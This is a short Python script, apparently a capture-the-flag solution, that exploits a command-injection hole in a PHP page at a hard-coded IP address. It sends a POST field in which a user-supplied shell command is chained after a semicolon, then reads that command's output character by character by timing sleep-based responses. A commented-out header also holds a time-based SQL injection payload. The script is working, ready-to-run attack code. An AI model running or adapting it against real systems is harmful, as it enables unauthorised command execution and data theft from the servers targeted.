import requests
url = 'http://123.206.31.85:49165/index.php'
s = requests.session()
allString = '''1234567890~`!@#$%^&*()-_=+[]{};:'"|\,<.>/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''
 
database = ''
flag = 1
comm =input('输入指令：')
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Referer':'http://123.206.31.85:49165/index.php',
}
cookies = dict(PHPSESSID='d637ecrlrp3ae9jgqqunu97f22')
for i in range(0,100):#根据自身需要改长度，如果空格连续出现四次以上，就说明后续没内容了
    for j in allString:
        #header = {
            #"X-Forwarded-For":"1'+(select case when (ascii(substr(database() from %d for 1))=%d) then sleep(3) else 0 end))#"%(i,ord(j))
            #}
        #print(j)
        if j == "^":
            #print('此处有空格')
            j = " "
            data={'c':"123;a=`"+comm+"`;b=' ';if [ ${a:"+str(i)+":1} == $b ];then sleep 4;fi"}
        else:
            data={'c':"123;a=`"+comm+"`;b=\'"+str(j)+"\';if [ ${a:"+str(i)+":1} == $b ];then sleep 4;fi"}
        r = requests.post(url,data=data,headers=headers,cookies=cookies)
        t = r.elapsed.total_seconds()
        #print(r.text)
        print(database+'     '+'the time of '+j+' is '+str(t))
        if t >= 4:
            database = database + j
            print('the '+str(i)+' place of database is '+j)
            break
        elif t < 4 and j == 'M':
            flag = 0
            break
    if flag == 0 :
        break
print('',database)